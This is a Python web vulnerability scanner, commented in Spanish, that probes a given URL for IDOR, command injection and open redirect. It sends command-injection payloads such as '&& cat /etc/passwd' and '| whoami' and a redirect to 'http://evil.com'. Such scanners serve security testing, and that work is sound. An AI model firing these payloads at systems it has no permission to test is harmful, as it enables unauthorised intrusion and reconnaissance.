import subprocess
import logging
import os
import time
import re
import asyncio
import aiohttp
from argparse import ArgumentParser
from urllib.parse import urlparse, urljoin

# Configuración del logging
logging.basicConfig(filename='vuln_scan_idor.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

class AdvancedVulnerabilityScanner:
    def __init__(self, base_url):
        self.base_url = self.validate_url(base_url)
        self.base_domain = urlparse(self.base_url).netloc

    def validate_url(self, url):
        if not url.startswith("http"):
            url = "https://" + url
        if not re.match(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', url):
            logging.error(f"URL no válida: {url}")
            raise ValueError("La URL proporcionada no es válida.")
        return url

    async def async_check_idor(self, session, resource):
        try:
            logging.info(f"[*] Verificando IDOR en: {self.base_url}")
            for user_id in [1, 2, 3, 4, 5]:  # Lista de IDs de usuario a probar
                vuln_url = f"{self.base_url}/{resource}/{user_id}"
                async with session.get(vuln_url, timeout=15) as response:
                    if response.status == 200 and "private" in await response.text():
                        logging.info(f"[+] Posible IDOR en: {vuln_url}")
                    else:
                        logging.info(f"[-] No se detectó IDOR en: {vuln_url}")
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logging.error(f"Error al verificar IDOR: {e}")
        except Exception as e:
            logging.error(f"Error inesperado al verificar IDOR: {e}")

    async def async_check_command_injection(self, session, param):
        try:
            logging.info(f"[*] Verificando Command Injection en: {self.base_url}")
            payloads = ["; ls", "&& cat /etc/passwd", "| whoami"]
            for payload in payloads:
                vuln_url = f"{self.base_url}?{param}={payload}"
                async with session.get(vuln_url, timeout=15) as response:
                    response_text = await response.text()
                    if "root:" in response_text or "uid=" in response_text:
                        logging.info(f"[+] Posible Command Injection en: {vuln_url}")
                    else:
                        logging.info(f"[-] No se detectó Command Injection en: {vuln_url}")
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logging.error(f"Error al verificar Command Injection: {e}")
        except Exception as e:
            logging.error(f"Error inesperado al verificar Command Injection: {e}")

    async def async_check_open_redirect(self, session, redirect_param):
        try:
            logging.info(f"[*] Verificando Open Redirect en: {self.base_url}")
            evil_url = "http://evil.com"
            vuln_url = f"{self.base_url}?{redirect_param}={evil_url}"
            async with session.get(vuln_url, timeout=15, allow_redirects=False) as response:
                if response.status in [301, 302] and response.headers.get('Location', '').startswith(evil_url):
                    logging.info(f"[+] Posible Open Redirect en: {vuln_url}")
                else:
                    logging.info(f"[-] No se detectó Open Redirect en: {vuln_url}")
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logging.error(f"Error al verificar Open Redirect: {e}")
        except Exception as e:
            logging.error(f"Error inesperado al verificar Open Redirect: {e}")

    async def scan_vulnerabilities_async(self):
        async with aiohttp.ClientSession() as session:
            tasks = [
                self.async_check_idor(session, "user/profile"),
                self.async_check_command_injection(session, "cmd"),
                self.async_check_open_redirect(session, "redirect")
            ]
            await asyncio.gather(*tasks)

    def scan(self):
        # Imprimir la URL por pantalla antes de comenzar
        print(f"Escaneando vulnerabilidades en: {self.base_url}")
        logging.info(f"Iniciando escaneo de: {self.base_url}")

        start_time = time.time()

        asyncio.run(self.scan_vulnerabilities_async())

        elapsed_time = time.time() - start_time
        logging.info(f"Escaneo completado en {elapsed_time:.2f} segundos.")

if __name__ == "__main__":
    parser = ArgumentParser(description="Escáner de vulnerabilidades avanzadas.")
    parser.add_argument("url", help="URL objetivo para el escaneo de vulnerabilidades.")
    args = parser.parse_args()

    try:
        scanner = AdvancedVulnerabilityScanner(args.url)
        scanner.scan()
    except ValueError as ve:
        print(f"Error: {ve}")
